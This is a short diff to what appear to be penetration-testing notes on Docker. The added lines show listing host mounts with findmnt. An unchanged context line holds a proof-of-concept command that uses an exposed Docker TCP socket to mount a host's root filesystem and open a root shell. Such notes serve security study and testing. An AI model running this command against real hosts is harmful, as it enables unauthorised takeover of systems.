@@ -90,3 +90,11 @@ Utilizing Docker via unprotected tcp socket (2375/tcp, maybe 2376/tcp with tls b
 #PoC
 docker -H tcp://<ip>:<port> run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
 ```
+
+## Search for docker containers (on the Host machine)
+
+We can employ **findmnt** to display the mounts connected to the system, including those used by Docker containers:
+
+```shell
+findmnt
+```
